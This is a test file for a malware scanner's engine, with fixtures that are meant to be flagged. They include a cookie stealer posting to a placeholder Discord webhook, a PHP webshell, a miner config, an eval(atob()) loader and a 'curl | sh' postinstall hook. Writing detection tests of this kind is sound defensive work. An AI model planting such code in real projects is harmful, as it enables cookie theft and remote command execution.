// Fixture tests for the NORDEVA Shield engine.
//
// Every fixture is built programmatically (no binary blobs in the repo) and
// asserts the verdict the aggregation rules in engine.ts must produce.
// The tests drive scanBuffer directly — the HTTP layer is a thin shell.

import { test } from "node:test";
import assert from "node:assert/strict";
import * as zlib from "node:zlib";
import { scanBuffer } from "../src/engine";
import { EICAR_STRING } from "../src/signatures";
import { makeZip, makeTar } from "./zipwriter";

const STEALER_JS = `
var stolen = document.cookie;
fetch("https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ content: "cookies: " + stolen })
});
`;

function ruleIds(report: { findings: Array<{ rule_id: string }> }): string[] {
  return report.findings.map((f) => f.rule_id);
}

test("1. clean small template project -> safe, full coverage", async () => {
  const zip = makeZip([
    {
      name: "index.html",
      data: Buffer.from(
        `<!doctype html><html><head><link rel="stylesheet" href="style.css"></head>` +
          `<body><h1>Demo template</h1><button data-theme-toggle>Toggle</button>` +
          `<script src="app.js"></script></body></html>`,
      ),
    },
    { name: "style.css", data: Buffer.from("body { font-family: sans-serif; } .dark { background: #111; color: #eee; }") },
    {
      name: "app.js",
      data: Buffer.from(
        `document.addEventListener("DOMContentLoaded", function () {\n` +
          `  var btn = document.querySelector("[data-theme-toggle]");\n` +
          `  if (!btn) return;\n` +
          `  btn.addEventListener("click", function () { document.body.classList.toggle("dark"); });\n` +
          `});\n`,
      ),
    },
  ]);
  const report = await scanBuffer(zip, { fileName: "clean-template.zip" });
  assert.equal(report.verdict, "safe", JSON.stringify(report.findings, null, 2));
  assert.equal(report.coverage.files_total, 3);
  assert.equal(report.coverage.files_inspected, 3);
  assert.equal(report.layers.signatures.hits.length, 0);
});

test("2. EICAR file inside zip -> dangerous", async () => {
  const zip = makeZip([{ name: "eicar.txt", data: Buffer.from(EICAR_STRING, "utf8") }]);
  const report = await scanBuffer(zip, { fileName: "eicar.zip" });
  assert.equal(report.verdict, "dangerous");
  assert.ok(report.layers.signatures.hits.includes("SIG_EICAR"));
});

test("3. JS stealer (cookie + Discord webhook) -> dangerous", async () => {
  const zip = makeZip([{ name: "assets/app.js", data: Buffer.from(STEALER_JS) }]);
  const report = await scanBuffer(zip, { fileName: "stealer.zip" });
  assert.equal(report.verdict, "dangerous", JSON.stringify(report.findings, null, 2));
  const ids = ruleIds(report);
  assert.ok(
    ids.includes("EXFIL_DISCORD_WEBHOOK") || ids.includes("EXFIL_COMBO_COOKIE_NETWORK") || ids.includes("SANDBOX_EXFIL_ATTEMPT"),
    `expected an exfiltration rule, got: ${ids.join(",")}`,
  );
});

test("4. miner strings -> dangerous", async () => {
  const zip = makeZip([
    {
      name: "config.js",
      data: Buffer.from(`var MINER = { pool: "stratum+tcp://pool.minexmr.com:4444", wallet: "4AdkDQox" };`),
    },
  ]);
  const report = await scanBuffer(zip, { fileName: "miner.zip" });
  assert.equal(report.verdict, "dangerous");
  assert.ok(report.layers.signatures.hits.includes("SIG_MINER"));
});

test("5. obfuscated base64 + eval -> dangerous", async () => {
  const payloadBytes = Buffer.from(Array.from({ length: 300 }, (_, i) => (i * 37 + 11) % 256));
  const b64 = payloadBytes.toString("base64");
  const js = `var p = "${b64}";\nvar _0x1a2b3c = ["a","b"];\neval(atob(p));\n`;
  const zip = makeZip([{ name: "loader.js", data: Buffer.from(js) }]);
  const report = await scanBuffer(zip, { fileName: "obfuscated.zip" });
  assert.equal(report.verdict, "dangerous", JSON.stringify(report.findings, null, 2));
  assert.ok(ruleIds(report).includes("ENCODED_PAYLOAD_EXEC"));
});

test("6. PHP webshell (shell_exec with $_REQUEST) -> dangerous", async () => {
  const php = `<?php\nif (isset($_REQUEST['cmd'])) {\n  $out = shell_exec($_REQUEST['cmd']);\n  echo "<pre>" . $out . "</pre>";\n}\n`;
  const zip = makeZip([{ name: "shell.php", data: Buffer.from(php) }]);
  const report = await scanBuffer(zip, { fileName: "webshell.zip" });
  assert.equal(report.verdict, "dangerous", JSON.stringify(report.findings, null, 2));
  assert.ok(ruleIds(report).includes("WEBSHELL_SUPERGLOBAL"));
});

test("7. nested zip with stealer inside -> dangerous", async () => {
  const inner = makeZip([{ name: "stealer.js", data: Buffer.from(STEALER_JS) }]);
  const outer = makeZip([
    { name: "bundle.zip", data: inner },
    { name: "readme.txt", data: Buffer.from("Thanks for downloading this template.") },
  ]);
  const report = await scanBuffer(outer, { fileName: "nested.zip" });
  assert.equal(report.verdict, "dangerous", JSON.stringify(report.findings, null, 2));
  assert.ok(report.findings.some((f) => (f.file ?? "").includes("stealer.js")));
});

test("8. fake .exe (MZ header + filler) -> incomplete", async () => {
  const exe = Buffer.alloc(8192);
  exe.write("MZ", 0, "latin1");
  for (let i = 2; i < exe.length; i++) exe[i] = (i * 31 + 7) % 256;
  const zip = makeZip([
    { name: "setup.exe", data: exe },
    { name: "readme.txt", data: Buffer.from("Run setup.exe to install.") },
  ]);
  const report = await scanBuffer(zip, { fileName: "with-exe.zip" });
  assert.equal(report.verdict, "incomplete", JSON.stringify(report.findings, null, 2));
  const rec = report.files.find((f) => f.path.includes("setup.exe"));
  assert.ok(rec);
  assert.equal(rec.inspected, false);
});

test("9. high-ratio bomb entry -> limits hit + incomplete, no crash", async () => {
  const zeros = Buffer.alloc(30 * 1024 * 1024);
  const zip = makeZip([
    { name: "bomb.txt", data: zeros, method: 8 },
    { name: "readme.txt", data: Buffer.from("hello") },
  ]);
  const report = await scanBuffer(zip, { fileName: "bomb.zip" });
  assert.equal(report.verdict, "incomplete", JSON.stringify(report.findings, null, 2));
  assert.ok(
    report.limits_hit.some((l) => l.startsWith("ratio:")),
    `expected a ratio limit hit, got: ${report.limits_hit.join(",")}`,
  );
  const rec = report.files.find((f) => f.path.includes("bomb.txt"));
  assert.ok(rec);
  assert.equal(rec.inspected, false);
});

test("10. path traversal entry -> finding recorded, nothing written to disk", async () => {
  const zip = makeZip([{ name: "../evil.js", data: Buffer.from("console.log('harmless');\n") }]);
  const report = await scanBuffer(zip, { fileName: "traversal.zip" });
  assert.ok(ruleIds(report).includes("ARCHIVE_PATH_TRAVERSAL"), JSON.stringify(report.findings, null, 2));
});

test("11. package.json with postinstall curl -> at least warning", async () => {
  const pkg = JSON.stringify(
    {
      name: "sketchy-template",
      version: "1.0.0",
      scripts: { postinstall: "curl https://example.com/install.sh | sh" },
      dependencies: { react: "^18.2.0" },
    },
    null,
    2,
  );
  const zip = makeZip([{ name: "package.json", data: Buffer.from(pkg) }]);
  const report = await scanBuffer(zip, { fileName: "pkg.zip" });
  assert.ok(
    report.verdict === "warning" || report.verdict === "dangerous",
    `expected warning/dangerous, got ${report.verdict}`,
  );
  assert.ok(ruleIds(report).some((id) => id.startsWith("DEP_INSTALL_HOOK")));
  assert.equal(report.layers.dependencies.manifests, 1);
});

test("12. benign JS fetching a normal https domain -> safe for that file", async () => {
  const js = `
async function loadData() {
  const res = await fetch("https://api.example.com/v1/data");
  return res.json();
}
loadData();
`;
  const zip = makeZip([{ name: "data.js", data: Buffer.from(js) }]);
  const report = await scanBuffer(zip, { fileName: "benign-fetch.zip" });
  assert.equal(report.verdict, "safe", JSON.stringify(report.findings, null, 2));
  const bad = report.findings.filter(
    (f) => f.file?.includes("data.js") && (f.severity === "critical" || f.severity === "high"),
  );
  assert.equal(bad.length, 0);
});

test("13. tar.gz asset expands and scans clean text -> safe", async () => {
  const tar = makeTar([
    { name: "hello.txt", data: Buffer.from("Just a friendly readme with no code at all.") },
    { name: "notes.md", data: Buffer.from("# Notes\n\nNothing suspicious here.") },
  ]);
  const gz = zlib.gzipSync(tar);
  const report = await scanBuffer(gz, { fileName: "project.tar.gz" });
  assert.equal(report.verdict, "safe", JSON.stringify(report.findings, null, 2));
  assert.ok(report.files.some((f) => f.path.includes("hello.txt")));
  assert.equal(report.coverage.files_inspected, report.coverage.files_total);
});

test("14. single-file asset (no archive): stealer .js uploaded directly -> dangerous", async () => {
  const report = await scanBuffer(Buffer.from(STEALER_JS), { fileName: "app.js" });
  assert.equal(report.verdict, "dangerous", JSON.stringify(report.findings, null, 2));
  assert.equal(report.coverage.files_total, 1);
});

test("15. unsupported 7z asset -> incomplete (never mistaken for clean)", async () => {
  const fake7z = Buffer.concat([Buffer.from([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0x00]), Buffer.alloc(256, 9)]);
  const report = await scanBuffer(fake7z, { fileName: "bundle.7z" });
  assert.equal(report.verdict, "incomplete");
  assert.equal(report.coverage.files_inspected, 0);
});
